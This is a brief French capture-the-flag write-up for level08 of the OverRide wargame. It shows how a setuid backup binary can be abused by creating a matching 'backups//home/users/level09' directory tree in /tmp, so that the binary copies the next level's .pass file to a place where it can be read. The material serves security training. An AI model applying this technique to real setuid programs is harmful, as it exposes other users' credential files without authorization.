RELRO           STACK CANARY      NX            PIE             RPATH      RUNPATH      FILE
Full RELRO      Canary found      NX disabled   No PIE          No RPATH   No RUNPATH   /home/users/level08/level08
level08@OverRide:~$ file level08 
level08: setuid setgid ELF 64-bit LSB executable, x86-64, version 1 (SYSV), dynamically linked (uses shared libs), for GNU/Linux 2.6.24, BuildID[sha1]=0xf8990336d0891364d2754de14a6cc793677b9122, not stripped

Ce binaire prend un argument en parametre. Le parametre de ce binaire sera un fichier qui sera ouvert puis lu, son contenu sera copier dans ".backups/<argv[1]>" ou le fichier sera creer, attention, si le fichier existe deja, le open renverra une erreur.

Notre but et d'ouvrir le fichier .pass du level09.

Nous nous placons donc dans /tmp qui est un repertoire ou nous avons les droits d'ecriture.
Afins que la fonction open() puisse creer le fichier et ne renvoit pas d'erreur, nous creons le path comme ceci:
mkdir -p backups//home/users/level09

level08@OverRide:/tmp$ ~/level08 /home/users/level09/.pass

Le flag du level09 a donc etait copier dans le repertoire suivant:
level08@OverRide:/tmp$ cat ./backups//home/users/level09/.pass

